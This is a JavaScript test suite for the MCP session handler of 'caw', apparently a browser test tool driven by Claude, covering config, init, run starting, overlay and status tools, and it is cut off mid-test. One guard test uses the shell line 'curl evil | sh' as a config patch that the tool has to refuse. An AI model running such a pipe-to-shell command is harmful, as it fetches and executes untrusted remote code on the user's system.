import assert from 'node:assert/strict';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, utimesSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { test } from 'node:test';

import { sessionMcpHandler, startArgs } from '../src/host/session-mcp.mjs';
import { initProject, listProject, validateProject } from '../src/host/project-data.mjs';

const TEMPLATE = readFileSync(new URL('../templates/caw.config.example.json', import.meta.url), 'utf8');
const STEPS = 'writes: false\nsteps:\n  - id: S1\n    name: Öffnen\n    do: ""\n    expect: Startseite\n  - id: S2\n    name: Bestellen\n    do: ""\n    expect: Bestätigung\n';
/** The template with an overlay block: one part web, allowed on a deployed environment dev. */
const OVERLAY_CONFIG = (() => {
    const config = JSON.parse(TEMPLATE);
    config.environments.dev = { url: 'https://dev.example' };
    config.overlay = { environments: ['dev'], parts: { web: { dir: '.' } } };
    return JSON.stringify(config, null, 4);
})();
const PROBES = { chrome: async () => {}, claude: () => '2.1.0', docker: async () => { throw new Error('Kein Docker gefunden'); }, reachable: async () => true };

const tempDir = (t) => {
    const dir = mkdtempSync(join(tmpdir(), 'caw-session-'));
    t.after(() => rmSync(dir, { recursive: true, force: true }));
    return dir;
};

/** A project with the template config and one test. */
const project = (t, { config = TEMPLATE } = {}) => {
    const root = tempDir(t);
    if (config !== null) writeFileSync(join(root, 'caw.config.json'), config);
    mkdirSync(join(root, 'caw', 'tests'), { recursive: true });
    writeFileSync(join(root, 'caw', 'tests', 'bestellung.yaml'), STEPS);
    return root;
};

/** The handler with fake spawn and stubs; `call` returns the MCP result. */
const session = (root, deps = {}) => {
    const spawned = [];
    const spawnRun = (file, args, options) => { spawned.push({ args, options }); return { pid: 2 ** 22 + 4321, unref: () => {} }; };
    const handler = sessionMcpHandler({ root, spawnRun, probes: PROBES, ...deps });
    const call = async (name, args = {}) => (await handler({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name, arguments: args } })).result;
    return { call, spawned };
};

test('mcp plumbing: data becomes structuredContent next to the text; text-only tools stay as they are', async (t) => {
    const root = project(t);
    const { call } = session(root);
    const selection = await call('caw_selection');
    assert.equal(selection.structuredContent, undefined);
    assert.match(selection.content[0].text, /Noch kein Element/);
    const listed = await call('caw_list');
    assert.equal(listed.isError, false);
    assert.equal(listed.content[0].type, 'text');
    assert.match(listed.content[0].text, /^1 Tests\.\n\{/);
    assert.deepEqual(JSON.parse(listed.content[0].text.split('\n').slice(1).join('\n')), listed.structuredContent);
});

test('caw_doctor, caw_validate and caw_list: data with counts, problems and recording state', async (t) => {
    const root = project(t);
    const { call } = session(root);
    const doctor = (await call('caw_doctor', { attach: true })).structuredContent;
    assert.ok(Array.isArray(doctor.checks) && doctor.checks.length > 0);
    assert.equal(doctor.counts.ok + doctor.counts.blocking + doctor.counts.optional + doctor.counts.info, doctor.checks.length);
    assert.ok(doctor.checks.every((check) => typeof check.ok === 'boolean' && typeof check.text === 'string'));

    const validated = await call('caw_validate');
    assert.match(validated.content[0].text, /validate: Config und 1 Tests sind in Ordnung/);
    const data = validated.structuredContent;
    assert.equal(data.ok, true);
    assert.deepEqual(data.config, { issues: [], todo: [], notes: data.config.notes });
    assert.equal(data.tests[0].id, 'bestellung');
    assert.deepEqual(data.tests[0].problems, []);
    assert.equal(data.tests[0].code[0].env, 'local');
    assert.match(data.tests[0].hints[0], /bestellung\.yaml/);

    const listed = (await call('caw_list')).structuredContent;
    assert.equal(listed.config, 'ok');
    assert.deepEqual(listed.tests[0], {
        id: 'bestellung', start: '/', role: 'tester', environments: ['local'], writes: false, recording: { state: 'none', stale: [] },
        steps: [{ id: 'S1', name: 'Öffnen', recording: 'none' }, { id: 'S2', name: 'Bestellen', recording: 'none' }],
    });

    // A test with an unknown role: a problem of this test, not a crash; the list still shows the others.
    writeFileSync(join(root, 'caw', 'tests', 'fremd.yaml'), `role: niemand\n${STEPS}`);
    writeFileSync(join(root, 'caw', 'tests', 'kaputt.yaml'), 'steps: [');
    const broken = validateProject(root);
    assert.equal(broken.ok, false);
    assert.match(broken.tests.find(({ id }) => id === 'fremd').problems[0], /niemand/);
    assert.equal(broken.tests.find(({ id }) => id === 'kaputt').problems.length, 1);
    assert.ok(listProject(root).tests.find(({ id }) => id === 'kaputt').error);
    assert.match((await call('caw_validate')).content[0].text, /validate: 2 Befunde/);
});

test('caw_validate and caw_list without a config: config error as data, tests as written', async (t) => {
    const root = project(t, { config: null });
    const { call } = session(root);
    const validated = (await call('caw_validate')).structuredContent;
    assert.equal(validated.ok, false);
    assert.equal(validated.code, 'config-missing');
    assert.equal(validated.config.issues.length, 1);
    const listed = (await call('caw_list')).structuredContent;
    assert.equal(listed.config, 'missing');
    assert.equal(listed.tests[0].start, null, 'without a config only what the test says');
});

test('caw_config: read returns raw config and effective environments, patch goes through writeConfig and refuses an invalid result', async (t) => {
    const root = project(t);
    const patches = [];
    const writeConfig = (dir, patch, { dryRun }) => {
        patches.push({ dir, patch, dryRun });
        return patch.framework === 'cobol'
            ? { ok: false, issues: ['framework: cobol ist unbekannt'], config: undefined }
            : { ok: true, issues: [], config: { ...JSON.parse(TEMPLATE), ...patch } };
    };
    const { call } = session(root, { writeConfig });
    const read = await call('caw_config', { read: true });
    assert.match(read.content[0].text, /caw\.config\.json ist gültig/);
    assert.equal(read.structuredContent.state, 'ok');
    assert.deepEqual(read.structuredContent.raw, JSON.parse(TEMPLATE));
    assert.deepEqual(Object.keys(read.structuredContent.environments), Object.keys(JSON.parse(TEMPLATE).environments));
    assert.equal(typeof Object.values(read.structuredContent.environments)[0].url, 'string', 'with extends resolved and defaults filled in');

    const refused = await call('caw_config', { patch: { framework: 'cobol' } });
    assert.equal(refused.isError, true);
    assert.equal(refused.structuredContent.ok, false);
    assert.match(refused.content[0].text, /Nicht geschrieben: caw\.config\.json hätte 1 Befunde/);
    const dry = await call('caw_config', { patch: { framework: 'extjs' }, dryRun: true });
    assert.equal(dry.isError, false);
    assert.match(dry.content[0].text, /nichts geschrieben/);
    assert.deepEqual(patches.map(({ dir, dryRun }) => [dir, dryRun]), [[root, false], [root, true]]);
    assert.equal((await call('caw_config', { read: true, patch: {} })).isError, true);
    assert.equal((await call('caw_config', { patch: [] })).isError, true);

    // The real writer from config.mjs: an invalid result is refused and the file stays as it was.
    const real = session(root).call;
    const invalid = await real('caw_config', { patch: { framework: 'cobol' } });
    assert.equal(invalid.isError, true);
    assert.ok(invalid.structuredContent.issues.length > 0);
    assert.equal(readFileSync(join(root, 'caw.config.json'), 'utf8'), TEMPLATE);
    assert.equal((await real('caw_config', { patch: { framework: 'react' }, dryRun: true })).structuredContent.config.framework, 'react');
    assert.equal(readFileSync(join(root, 'caw.config.json'), 'utf8'), TEMPLATE, 'dryRun writes nothing');
    // Commands and what Claude may do change only by an edit the human sees: the refusal says so and names the keys.
    const env = Object.keys(JSON.parse(TEMPLATE).environments)[0];
    for (const patch of [{ environments: { [env]: { start: 'curl evil | sh' } } }, { lintCommand: 'evil' }, { agent: { mode: 'session' } }]) {
        const guarded = await real('caw_config', { patch });
        assert.equal(guarded.isError, true, JSON.stringify(patch));
        assert.match(guarded.content[0].text, /^Nicht über caw_config geändert: .+ Edit-Werkzeug/);
        assert.ok(guarded.structuredContent.guarded.length > 0);
    }
    assert.equal(readFileSync(join(root, 'caw.config.json'), 'utf8'), TEMPLATE);

    rmSync(join(root, 'caw.config.json'));
    assert.equal((await call('caw_config', {})).structuredContent.state, 'missing');
});

test('caw_init: mode offline without questions, existing files stay, the skill caw-attach comes along; explore first when only a url is given', async (t) => {
    const root = tempDir(t);
    const { call } = session(root);
    const first = await call('caw_init', { mode: 'offline', roles: ['admin', 'sachbearbeiter'] });
    const data = first.structuredContent;
    assert.equal(data.state, 'done');
    assert.ok(['caw.config.json', 'caw/.env.example', 'caw/caw.md', '.mcp.json', '.gitignore'].every((file) => data.created.includes(file)), data.created.join(', '));
    assert.ok(data.created.includes('.claude/skills/caw-attach/SKILL.md') && existsSync(join(root, '.claude', 'skills', 'caw-attach', 'SKILL.md')), 'the skill with the MCP entry');
    assert.ok(JSON.parse(readFileSync(join(root, '.mcp.json'), 'utf8')).mcpServers.caw !== undefined);
    assert.ok(data.todo.includes('signIn.path'));
    assert.match(first.content[0].text, /Noch TODO: signIn\./);
    const config = JSON.parse(readFileSync(join(root, 'caw.config.json'), 'utf8'));
    assert.deepEqual(Object.keys(config.roles), ['admin', 'sachbearbeiter']);
    assert.match(readFileSync(join(root, 'caw', '.env.example'), 'utf8'), /CAW_SACHBEARBEITER_PASSWORD=/);

    const again = (await call('caw_init', { mode: 'offline' })).structuredContent;
    assert.deepEqual(again.created, []);
    assert.ok(again.skipped.includes('caw.config.json') && again.skipped.includes('.claude/skills/caw-attach/SKILL.md'));
    assert.deepEqual(again.todo, data.todo, 'TODO of the config on disk');

    const fresh = tempDir(t);
    assert.equal(initProject(fresh, { url: 'http://localhost:5173' }).state, 'explore-first');
    assert.ok(!existsSync(join(fresh, 'caw.config.json')));
    writeFileSync(join(fresh, 'x.json'), JSON.stringify({ url: 'http://localhost:5173', signIn: { type: 'none' }, framework: { value: 'react' } }));
    const explored = initProject(fresh, { fromExplore: 'x.json', noMcp: true });
    assert.equal(explored.explored, true);
    assert.ok(!explored.created.includes('.mcp.json'));
    assert.equal(JSON.parse(readFileSync(join(fresh, 'caw.config.json'), 'utf8')).environments.local.url, 'http://localhost:5173');
    assert.equal((await session(fresh).call('caw_init', { mode: 'write', url: 'ftp://x' })).isError, true);
    assert.equal((await session(fresh).call('caw_init', { offline: true })).isError, true, 'mode is required');
    assert.match((await session(fresh).call('caw_init', { mode: 'explore', url: 'http://localhost:5173', roles: ['x'] })).content[0].text, /roles/, 'fields of another mode are named');
    // write with what the session decided: environment name, team language and the address switches on the environment.
    const decided = tempDir(t);
    writeFileSync(join(decided, 'x.json'), JSON.stringify({ url: 'http://staging.example.com:8080', signIn: { type: 'none' }, framework: { value: 'react' } }));
    const written = await session(decided).call('caw_init', { mode: 'write', fromExplore: 'x.json', env: 'staging', language: 'fr', allowHttp: true, insecureTls: true, noMcp: true });
    assert.equal(written.isError, false, written.content[0].text);
    const staged = JSON.parse(readFileSync(join(decided, 'caw.config.json'), 'utf8'));
    assert.equal(staged.language, 'fr');
    assert.deepEqual(staged.environments.staging, { url: 'http://staging.example.com:8080', agent: true, writable: false, insecureTls: true, allowHttp: true });
    assert.equal((await session(decided).call('caw_init', { mode: 'write', env: 'Staging_1' })).isError, true);
    // fromExplore stays in the project and never quotes the file it could not read.
    const outside = join(tempDir(t), 'secret.json');
    writeFileSync(outside, 'PASSWORD=hunter2-not-json');
    for (const from of [outside, '../secret.json', join('..', '..', 'secret.json')]) {
        const refused = await session(tempDir(t)).call('caw_init', { mode: 'write', fromExplore: from, noMcp: true });
        assert.equal(refused.isError, true, from);
        assert.match(refused.content[0].text, /liegt nicht im Projekt/, from);
    }
    const notJson = tempDir(t);
    writeFileSync(join(notJson, 'x.json'), 'PASSWORD=hunter2-not-json');
    const unreadable = await session(notJson).call('caw_init', { mode: 'write', fromExplore: 'x.json', noMcp: true });
    assert.equal(unreadable.isError, true);
    assert.match(unreadable.content[0].text, /kein Explore-Ergebnis/);
    assert.doesNotMatch(unreadable.content[0].text, /hunter2/);
});

test('caw_init explore: spawned detached with --login/--no-login or --yes, never asks on stdin', async (t) => {
    const root = tempDir(t);
    const { call, spawned } = session(root);
    assert.equal((await call('caw_init', { mode: 'explore', url: 'http://localhost:5173' })).isError, true, 'login or yes is required');
    const started = await call('caw_init', { mode: 'explore', url: 'http://localhost:5173', login: false, insecureTls: true, wait: false });
    assert.match(started.content[0].text, /explore gestartet/);
    assert.deepEqual(spawned[0].args.slice(1), ['init', '--explore-only', '--url', 'http://localhost:5173', '--no-login', '--insecure-tls']);
    assert.equal(spawned[0].options.stdio[0], 'ignore');
    assert.equal(started.structuredContent.state, 'started');
});

test('caw_init explore waits for the window and returns the suggestions', async (t) => {
    const root = tempDir(t);
    let polls = 0;
    // The window is open for two polls; meanwhile explore writes its result.
    const alive = () => {
        polls += 1;
        if (polls === 2) {
            mkdirSync(join(root, 'caw'), { recursive: true });
            writeFileSync(join(root, 'caw', '.explore.json'), JSON.stringify({ url: 'http://localhost:5173', framework: { value: 'react' } }));
        }
        return polls < 3;
    };
    const { call } = session(root, { windowWait: { alive, pollMs: 1 } });
    const done = await call('caw_init', { mode: 'explore', url: 'http://localhost:5173', login: true });
    assert.equal(done.structuredContent.state, 'done');
    assert.deepEqual(done.structuredContent.explore.framework, { value: 'react' });
    assert.match(done.content[0].text, /caw_init mit mode write/);
    // Closed without a result: an error with the last output; still open after the time limit: running.
    const closed = await session(tempDir(t), { windowWait: { alive: () => false } }).call('caw_init', { mode: 'explore', url: 'http://localhost:5173', login: true });
    assert.equal(closed.isError, true);
    assert.equal(closed.structuredContent.state, 'ended');
    const open = await session(tempDir(t), { windowWait: { alive: () => true, pollMs: 1, timeoutMs: 5 } }).call('caw_init', { mode: 'explore', url: 'http://localhost:5173', yes: true });
    assert.equal(open.structuredContent.state, 'running');
});

test('caw_role add only writes the config and the variable names; the human fills the values, no window', async (t) => {
    const root = project(t);
    const { call, spawned } = session(root, { windowWait: { alive: () => false } });
    const before = spawned.length;
    const added = await call('caw_role', { action: 'add', name: 'clerk' });
    assert.equal(spawned.length, before, 'nothing started');
    assert.equal(added.structuredContent.state, 'added');
    assert.deepEqual(added.structuredContent.variables, ['CAW_CLERK_USER', 'CAW_CLERK_PASSWORD']);
    assert.ok(!existsSync(join(root, 'caw/.env')), 'caw/.env is never written');
    assert.equal((await call('caw_role', { action: 'add' })).isError, true, 'the name is required');
    // login (SSO): the CLI's role login; name is required.
    const logins = [];
    await session(root, { spawnRun: (bin, args) => { logins.push(args); return { pid: 1, unref: () => {} }; }, windowWait: { alive: () => false } }).call('caw_role', { action: 'login', name: 'clerk', env: 'local' });
    assert.deepEqual(logins[0].slice(1), ['role', 'login', 'clerk', '--env', 'local']);
    assert.equal((await call('caw_role', { action: 'login' })).isError, true);
});

test('caw_init explore: its result shows up in caw_status once written', async (t) => {
    const root = tempDir(t);
    const { call } = session(root);
    await call('caw_init', { mode: 'explore', url: 'http://localhost:5173', yes: true, wait: false });
    mkdirSync(join(root, 'caw'), { recursive: true });
    writeFileSync(join(root, 'caw', '.explore.json'), JSON.stringify({ url: 'http://localhost:5173', framework: { value: 'react' } }));
    const status = (await call('caw_status')).structuredContent;
    assert.equal(status.state, 'ended');
    assert.deepEqual([status.started.command, status.started.args[0]], ['init', '--explore-only']);
    assert.deepEqual(status.explore.framework, { value: 'react' });
});

test('caw_start: typed fields build the command line, mixing with args and wrong fields are refused', async (t) => {
    assert.deepEqual(startArgs({ command: 'run', test: 'bestellung', env: 'dev', overlay: 'dev', headless: true }),
        ['bestellung', '--env', 'dev', '--overlay=dev', '--headless']);
    // The environment lifecycle and learning (SC-20, SC-21): the team's configured commands, flags only when true.
    assert.deepEqual(startArgs({ command: 'run', test: 'bestellung', env: 'ci', learn: true, start: true, reset: true }), ['bestellung', '--env', 'ci', '--learn', '--start', '--reset']);
    assert.deepEqual(startArgs({ command: 'open', test: 'bestellung', step: 'S2', start: true }), ['bestellung@S2', '--start']);
    assert.throws(() => startArgs({ command: 'record', test: 'b', learn: true }), /learn/);
    assert.throws(() => startArgs({ command: 'run', test: 'b', start: 'yes' }), /start/);
    assert.throws(() => startArgs({ command: 'run', test: 'b', start: true, overlay: true }), /--start mit overlay gibt es hier nicht/);
    assert.deepEqual(startArgs({ command: 'run', args: ['b', '--start'] }), ['b', '--start']);
    assert.throws(() => startArgs({ command: 'run', args: ['b', '--start', '--overlay'] }), /--start mit overlay/);
    assert.deepEqual(startArgs({ command: 'record', test: 'bestellung', step: 'S3', overlay: true }), ['bestellung@S3', '--overlay']);
    assert.deepEqual(startArgs({ command: 'record', test: 'bestellung' }), ['bestellung']);
    assert.deepEqual(startArgs({ command: 'open', test: 'bestellung', step: 'S2', env: 'dev' }), ['bestellung@S2', '--env', 'dev']);
    assert.deepEqual(startArgs({ command: 'open', test: 'bestellung' }), ['bestellung']);
    assert.throws(() => startArgs({ command: 'run', test: 'bestellung', target: 'dev' }), /target heißt jetzt env/);
    assert.deepEqual(startArgs({ command: 'open', env: 'dev', overlay: 'http://localhost:1841' }), ['--env', 'dev', '--overlay=http://localhost:1841']);
    assert.deepEqual(startArgs({ command: 'record', args: ['x', '--env', 'local'] }), ['x', '--env', 'local']);
    assert.throws(() => startArgs({ command: 'run', test: 'x', args: ['x'] }), /nicht beides/);
    assert.throws(() => startArgs({ command: 'run', test: 'x', zzz: 'S2' }), /zzz gilt nicht für run/, 'a field no command takes');
    assert.throws(() => startArgs({ command: 'run', test: 'x', step: 'S2' }), /step gilt nicht für run/);
    assert.throws(() => startArgs({ command: 'qqqq', test: 'x', step: 'S2' }), /run, record, open/, 'an unknown command');
    assert.throws(() => startArgs({ command: 'open', step: 'S2' }), /open braucht test/, 'a step needs its test');
    assert.throws(() => startArgs({ command: 'open', test: 'x', step: '--S2' }), /ungültigen Wert/);
    assert.throws(() => startArgs({ command: 'run', test: 'x', overlay: 'zwei teile' }), /overlay muss/);
    assert.throws(() => startArgs({ command: 'run', test: 'x', overlay: '--start' }), /overlay muss/);
    assert.deepEqual(startArgs({ command: 'run', test: 'x', overlay: 'orders,admin:dev' }), ['x', '--overlay=orders,admin:dev'], 'parts are checked by the CLI');
    assert.throws(() => startArgs({ command: 'run', test: '--all' }), /ungültigen Wert/);

    const root = project(t);
    const { call, spawned } = session(root, { overlayPreconditions: () => ({ state: 'ready' }) });
    const started = await call('caw_start', { command: 'open', test: 'bestellung', step: 'S2', env: 'local' });
    assert.equal(started.isError, false);
    assert.equal(started.structuredContent.state, 'started');
    assert.deepEqual(spawned[0].args.slice(1, -1), ['open', 'bestellung@S2', '--env', 'local']);
    assert.match(spawned[0].args.at(-1), /^--attach=[a-z0-9]{4}$/);
    assert.ok(started.content[0].text.startsWith('Gestartet'));
    const meta = JSON.parse(readFileSync(join(root, started.structuredContent.log.replace(/\.log$/, '.log.json')), 'utf8'));
    assert.equal(meta.command, 'open');
});

test('caw_start: open is allowed, config problems come back with their code', async (t) => {
    const root = project(t, { config: null });
    const { call, spawned } = session(root);
    const missing = await call('caw_start', { command: 'open', env: 'local' });
    assert.equal(missing.isError, true);
    assert.equal(missing.structuredContent.code, 'config-missing');
    assert.equal(spawned.length, 0);
    writeFileSync(join(root, 'caw.config.json'), '{ kaputt');
    assert.equal((await call('caw_start', { command: 'open' })).structuredContent.code, 'config-invalid');
    writeFileSync(join(root, 'caw.config.json'), TEMPLATE);
    await call('caw_start', { command: 'open', env: 'local' });
    assert.deepEqual(spawned[0].args.slice(1, -1), ['open', '--env', 'local']);
    assert.match(spawned[0].args.at(-1), /^--attach=[a-z0-9]{4}$/);
});

test('caw_start with overlay: a local code server that is not ready returns its start command instead of starting', async (t) => {
    const root = project(t, { config: OVERLAY_CONFIG });
    const asked = [];
    const overlayPreconditions = (dir, config, options) => {
        asked.push({ dir, options, framework: config.framework });
        return { state: 'down', framework: 'extjs', part: 'web', partDir: 'projects/apps/App', url: 'http://localhost:1841/', start: 'pnpm run watch' };
    };
    const { call, spawned } = session(root, { overlayPreconditions });
    const result = await call('caw_start', { command: 'run', test: 'bestellung', env: 'local', overlay: true });
    assert.equal(spawned.length, 0, 'nothing started');
    assert.deepEqual(result.structuredContent, { state: 'down', part: 'web', url: 'http://localhost:1841/', start: 'pnpm run watch', partDir: 'projects/apps/App', framework: 'extjs' });
    assert.match(result.content[0].text, /Nicht gestartet \(down\).*http:\/\/localhost:1841\/.*projects\/apps\/App: pnpm run watch/);
    assert.deepEqual(asked[0].options, { target: 'local', part: 'web' });
    // open with a test: every part of overlay.parts; the step does not matter.
    await call('caw_start', { command: 'open', test: 'bestellung', step: 'S2', env: 'local', overlay: true });
    assert.deepEqual(asked.at(-1).options, { target: 'local', part: 'web' });
    asked.pop();
    // Raw args with --overlay are checked as well; without overlay there is no check.
    await call('caw_start', { command: 'record', args: ['bestellung', '--env=local', '--overlay=build'] });
    assert.equal(asked.length, 2);
    assert.equal(spawned.length, 0);
    await call('caw_start', { command: 'run', test: 'bestellung' });
    assert.equal(asked.length, 2);
    assert.equal(spawned.length, 1);
    // --start with overlay never comes from the session: it starts the local code server itself.
    const refused = await call('caw_start', { command: 'run', args: ['bestellung', '--overlay', '--start'] });
    assert.equal(refused.isError, true);
    assert.match(refused.content[0].text, /--start mit overlay gibt es hier nicht/);
    assert.equal(spawned.length, 1);
});

test('caw_start with overlay: the server on another port starts the run against the found URL', async (t) => {
    const root = project(t, { config: OVERLAY_CONFIG });
    const overlayPreconditions = () => ({ state: 'moved', framework: 'extjs', part: 'web', partDir: 'App', url: 'http://localhost:1841/', foundUrl: 'http://localhost:52775/', start: 'pnpm run watch' });
    const { call, spawned } = session(root, { overlayPreconditions });
    const typed = await call('caw_start', { command: 'run', test: 'bestellung', env: 'local', overlay: true });
    assert.equal(typed.structuredContent.state, 'started');
    assert.deepEqual(spawned[0].args.slice(1, -1), ['run', 'bestellung', '--env', 'local', '--overlay=http://localhost:52775/']);
    assert.match(spawned[0].args.at(-1), /^--attach=[a-z0-9]{4}$/);
    assert.deepEqual(typed.structuredContent.overlay, { state: 'moved', url: 'http://localhost:1841/', foundUrl: 'http://localhost:52775/', part: 'web' });
    assert.match(typed.content[0].text, /läuft unter http:\/\/localhost:52775\/.*overlay\.parts\.web\.url/);
    rmSync(join(root, '.caw'), { recursive: true, force: true });
    // Raw args: a separate value is replaced as well.
    await call('caw_start', { command: 'open', args: ['--overlay', 'http://localhost:1841', '--env', 'local'] });
    assert.deepEqual(spawned[1].args.slice(1, -1), ['open', '--overlay=http://localhost:52775/', '--env', 'local']);
    assert.match(spawned[1].args.at(-1), /^--attach=[a-z0-9]{4}$/);
});

test('caw_overlay status: overlayStatus in-process, as data; errors come back as data', async (t) => {
    const root = project(t, { config: OVERLAY_CONFIG });
    const asked = [];
    let reply = { state: 'ready', framework: 'web', part: 'web', partDir: '.', url: 'http://localhost:5173/', start: 'npm run dev' };
    const overlayPreconditions = (dir, config, options) => {
        asked.push(options);
        if (reply instanceof Error) throw reply;
        return reply;
    };
    const { call, spawned } = session(root, { overlayPreconditions, execCli: async () => { throw new Error('no CLI for status'); } });
    const ready = await call('caw_overlay', { action: 'status', env: 'dev' });
    assert.equal(ready.isError, false);
    assert.deepEqual(ready.structuredContent, reply);
    assert.deepEqual(asked[0], { target: 'dev', part: undefined });
    assert.match(ready.content[0].text, /^overlay status: ready/);
    assert.equal(spawned.length, 0);
    reply = Object.assign(new Error('Kein Ziel'), { code: 'usage' });
    const failed = await call('caw_overlay', { action: 'status' });
    assert.equal(failed.isError, true);
    assert.deepEqual(failed.structuredContent, { state: 'error', code: 'usage', message: 'Kein Ziel' });
    assert.equal((await call('caw_overlay', { action: 'restart' })).isError, true);
    assert.equal((await call('caw_overlay', { action: 'status', part: '--x' })).isError, true);
    assert.equal((await call('caw_overlay', { action: 'status' })).isError, true, 'app is no field any more');
});

test('caw_overlay check/apply: runs the CLI with --json, returns its result; falls back to the file; timeout is an error', async (t) => {
    const root = project(t, { config: OVERLAY_CONFIG });
    const calls = [];
    const result = { state: 'ready', parts: [{ label: 'app', status: 'local' }], missed: [], notLoaded: [], suggestion: null };
    let reply = { code: 0, out: `[caw] noise\n${JSON.stringify(result)}\n`, err: '' };
    const execCli = async (args, options) => { calls.push({ args, options }); return typeof reply === 'function' ? reply() : reply; };
    const { call } = session(root, { execCli });
    const checked = await call('caw_overlay', { action: 'apply', env: 'dev', part: 'antrag' });
    assert.deepEqual(calls[0].args, ['overlay', 'check', '--json', '--env', 'dev', '--part', 'antrag', '--apply']);
    assert.equal(calls[0].options.timeoutMs, 180_000);
    assert.deepEqual(checked.structuredContent, { ...result, exit: 0 });
    assert.match(checked.content[0].text, /overlay check: ready/);

    reply = () => {
        mkdirSync(join(root, '.caw'), { recursive: true });
        writeFileSync(join(root, '.caw', 'overlay-check.json'), JSON.stringify({ ...result, state: 'incomplete' }));
        return { code: 2, out: '', err: 'unvollständig' };
    };
    const fromFile = await call('caw_overlay', { action: 'check' });
    assert.equal(fromFile.structuredContent.state, 'incomplete');
    assert.equal(fromFile.structuredContent.exit, 2);
    assert.equal(fromFile.isError, false);

    reply = { code: null, out: '', err: '', timedOut: true };
    const late = await call('caw_overlay', { action: 'check' });
    assert.equal(late.isError, true);
    assert.equal(late.structuredContent.state, 'timeout');
    assert.equal((await call('caw_overlay', { action: 'check', env: '--apply' })).isError, true);
});

test('caw_guide: the index without topic, a topic as Markdown; overlay topics and tool only while the config has an overlay block', async (t) => {
    const root = project(t);
    const { call } = session(root);
    const index = await call('caw_guide');
    assert.match(index.content[0].text, /- setup: /);
    assert.ok(!index.structuredContent.topics.some(({ name }) => name === 'overlay'));
    assert.match((await call('caw_guide', { topic: 'setup' })).content[0].text, /^# caw: set up a project/);
    assert.equal((await call('caw_guide', { topic: 'overlay' })).isError, true);
    assert.equal(await call('caw_overlay', { action: 'status' }), undefined, 'no such tool without the block: a JSON-RPC error, no result');
    const refused = await call('caw_start', { command: 'run', test: 'bestellung', env: 'local', overlay: true });
    assert.equal(refused.isError, true);
    assert.match(refused.content[0].text, /overlay/);
    writeFileSync(join(root, 'caw.config.json'), OVERLAY_CONFIG);
    assert.ok((await call('caw_guide')).structuredContent.topics.some(({ name }) => name === 'overlay'));
    assert.match((await call('caw_guide', { topic: 'overlay' })).content[0].text, /^# caw: local code/);
});

test('caw_config: a patch that switches the overlay on or off sends tools/list_changed; others and dryRun do not', async (t) => {
    const root = project(t);
    const sent = [];
    const handler = sessionMcpHandler({ root, probes: PROBES });
    const patch = async (args) => (await handler({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'caw_config', arguments: args } }, (note) => sent.push(note))).result;
    const names = async () => (await handler({ jsonrpc: '2.0', id: 2, method: 'tools/list' })).result.tools.map(({ name }) => name);
    assert.ok(!(await names()).includes('caw_overlay'));
    const overlay = { environments: { dev: { url: 'https://dev.example' } }, overlay: { environments: ['dev'], parts: { web: { dir: '.' } } } };
    await patch({ patch: overlay, dryRun: true });
    await patch({ patch: { readyTimeoutMs: 30000 } });
    assert.deepEqual(sent, []);
    const on = await patch({ patch: overlay });
    assert.equal(on.isError, false, on.content[0].text);
    assert.deepEqual(sent, [{ jsonrpc: '2.0', method: 'notifications/tools/list_changed' }]);
    assert.ok((await names()).includes('caw_overlay'));
    await patch({ patch: { overlay: null } });
    assert.equal(sent.length, 2);
    assert.ok(!(await names()).includes('caw_overlay'));
});

test('caw_status: last run from last-run.json with result, last step and artefacts; newer overlay check', async (t) => {
    const root = project(t);
    const { call } = session(root);
    assert.equal((await call('caw_status')).structuredContent.state, 'idle');

    const runDir = join(root, '.caw', 'runs', '2026-11-11T12-00-00-000Z-bestellung');
    mkdirSync(join(runDir, 'agent'), { recursive: true });
    const verdict = { status: 'fail', code: 1, reason: 'S2: keine Bestätigung', results: [{ id: 'S1', status: 'pass' }, { id: 'S2', status: 'fail', note: 'keine Bestätigung' }], failures: [], warnings: ['langsam'], testedCode: 'deployed', advice: [] };
    writeFileSync(join(runDir, 'result.json'), JSON.stringify(verdict));
    for (const name of ['report.md', 'chat.log', 'trace.zip', 'trace-1.zip', 'network.json', 'agent/claude-1.log', 'notes.txt']) writeFileSync(join(runDir, name), '');
    const startedAt = new Date(Date.now() - 60_000).toISOString();
    writeFileSync(join(root, '.caw', 'last-run.json'), JSON.stringify({ runId: '2026-11-11T12-00-00-000Z-bestellung', runDir, pid: 1, command: 'run', test: 'bestellung', target: 'local', startedAt }));
    writeFileSync(join(root, '.caw', 'overlay-check.json'), JSON.stringify({ state: 'ready' }));

    const status = await call('caw_status');
    const data = status.structuredContent;
    assert.equal(data.state, 'ended');
    assert.equal(data.runDir, '.caw/runs/2026-11-11T12-00-00-000Z-bestellung');
    assert.deepEqual([data.command, data.test, data.env], ['run', 'bestellung', 'local']);
    assert.deepEqual(data.result, { status: 'fail', code: 1, reason: 'S2: keine Bestätigung', results: verdict.results, failures: [], warnings: ['langsam'] });
    assert.deepEqual(data.lastStep, { id: 'S2', status: 'fail', note: 'keine Bestätigung' });
    const base = '.caw/runs/2026-11-11T12-00-00-000Z-bestellung';
    assert.deepEqual(data.artefacts, ['report.md', 'result.json', 'chat.log', 'network.json', 'trace-1.zip', 'trace.zip', 'agent/claude-1.log'].map((name) => `${base}/${name}`));
    assert.deepEqual(data.overlayCheck, { state: 'ready' });
    assert.match(status.content[0].text, /Letzter Lauf 2026-11-11T12-00-00-000Z-bestellung: fail/);

    // An overlay check older than the run is left out.
    const old = new Date(Date.now() - 120_000);
    utimesSync(join(root, '.caw', 'overlay-check.json'), old, old);
    assert.equal((await call('caw_status')).structuredContent.overlayCheck, undefined);

    // Without last-run.json: the newest run folder.
    rmSync(join(root, '.caw', 'last-run.json'));
    mkdirSync(join(root, '.caw', 'runs', '2026-11-11T13-00-00-000Z-bestellung-demonstration'));
    writeFileSync(join(root, '.caw', 'runs', '2026-11-11T13-00-00-000Z-bestellung-demonstration', 'failures.json'), '[]');
    const fallback = (await call('caw_status')).structuredContent;
    assert.equal(fallback.runId, '2026-11-11T13-00-00-000Z-bestellung-demonstration');
    assert.deepEqual(fallback.artefacts, ['.caw/runs/2026-11-11T13-00-00-000Z-bestellung-demonstration/failures.json']);
    assert.equal(fallback.result, undefined);
});

test('caw_status wait: returns on a new caw-ai message, not on replay steps; at the latest after wait seconds', async (t) => {
    const root = project(t);
    const { call } = session(root, { windowWait: { pollMs: 20 } });
    mkdirSync(join(root, '.caw'), { recursive: true });
